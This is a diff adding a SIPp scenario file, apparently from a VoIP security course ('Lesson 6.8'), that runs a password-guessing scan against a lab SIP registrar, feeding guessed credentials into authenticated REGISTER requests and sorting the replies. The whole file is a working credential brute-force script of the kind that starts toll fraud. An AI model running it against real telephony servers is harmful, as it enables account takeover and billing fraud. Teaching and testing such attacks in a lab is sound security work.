@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!-- Lesson 6.8: a password-guessing scan (the start of toll fraud). Each call takes one line of the injection file
+     (-inf): field0 = the user tried, field1 = [authentication username=<user> password=<guess>]. REGISTER -> 401 ->
+     REGISTER with the guessed credentials -> 200 (the guess was right) or 401 again (wrong: the registrar challenges
+     again) or 403. The scanner's REGISTER has no real Contact behind it: Expires 60. -->
+<scenario name="sip-lab password guessing">
+  <send retrans="500">
+    <![CDATA[
+      REGISTER sip:lab.sip SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      Max-Forwards: 70
+      From: <sip:[field0]@lab.sip>;tag=[pid]SIPpTag00[call_number]
+      To: <sip:[field0]@lab.sip>
+      Call-ID: [call_id]
+      CSeq: 1 REGISTER
+      Contact: <sip:[field0]@[local_ip]:[local_port]>
+      Expires: 60
+      User-Agent: friendly-scanner
+      Content-Length: 0
+
+    ]]>
+  </send>
+  <recv response="401" auth="true"/>
+  <send retrans="500">
+    <![CDATA[
+      REGISTER sip:lab.sip SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      Max-Forwards: 70
+      From: <sip:[field0]@lab.sip>;tag=[pid]SIPpTag00[call_number]
+      To: <sip:[field0]@lab.sip>
+      Call-ID: [call_id]
+      CSeq: 2 REGISTER
+      Contact: <sip:[field0]@[local_ip]:[local_port]>
+      Expires: 60
+      [field1]
+      User-Agent: friendly-scanner
+      Content-Length: 0
+
+    ]]>
+  </send>
+  <recv response="401" optional="true" next="end"/>
+  <recv response="403" optional="true" next="end"/>
+  <recv response="200"/>
+  <label id="end"/>
+</scenario>
